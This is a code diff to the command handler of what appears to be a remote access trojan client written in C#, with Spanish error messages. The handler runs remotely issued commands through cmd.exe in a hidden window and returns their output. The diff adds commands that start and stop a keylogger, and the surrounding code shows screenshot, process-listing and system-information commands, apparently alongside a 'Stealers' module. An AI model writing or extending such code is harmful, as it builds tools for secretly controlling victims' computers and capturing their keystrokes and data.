@@ -2,6 +2,7 @@
 using Client.Stealers;
 using Client.Util;
 using System.Diagnostics;
+using System.Text;
 
 
 namespace Client.Commands
@@ -11,19 +12,42 @@ namespace Client.Commands
 
         public static string ExecuteCommand(string command) {
 
-            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
-            processInfo.RedirectStandardOutput = true;
-            processInfo.UseShellExecute = false;
-            processInfo.CreateNoWindow = true;
+            if (string.IsNullOrWhiteSpace(command))
+                return "[ERROR] El comando está vacío.";
 
+            try
+            {
+                var processInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = "/c " + command,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    StandardOutputEncoding = Encoding.UTF8,
+                    StandardErrorEncoding = Encoding.UTF8
+                };
 
-            Process process = new Process();
-            process.StartInfo = processInfo;
-            process.Start();
+                using (var process = new Process { StartInfo = processInfo })
+                {
+                    process.Start();
 
-            string output = process.StandardOutput.ReadToEnd();
-            process.WaitForExit();
-            return output;
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    process.WaitForExit();
+
+                    if (!string.IsNullOrWhiteSpace(error))
+                        output += $"\n[Error]\n{error}";
+
+                    return output;
+                }
+            }
+            catch (Exception ex)
+            {
+                return $"[EXCEPCIÓN] {ex.Message}";
+            }
         }
 
         public static async Task<string> ProcessCommandAsync(string command)
@@ -32,7 +56,15 @@ namespace Client.Commands
 
             if (command.StartsWith("exec"))
             {
-                response = HandleCommands.ExecuteCommand(command.Substring(5));
+                response = "CMDOUT:"+HandleCommands.ExecuteCommand(command.Substring(5));
+            }
+            else if (command == "keylogger")
+            {
+                Keylogger.start();
+            }
+            else if (command == "keylogger stop")
+            {
+                Keylogger.stop();
             }
             else if (command == "list_processes")
             {
@@ -66,7 +98,7 @@ namespace Client.Commands
             }
             else if (command == "system_info")
             {
-                response = SystemInfo.GetSystemInfo();
+                response = await SystemInfo.GetSystemInfo();
             }
             else if (command == "screenshot")
             {
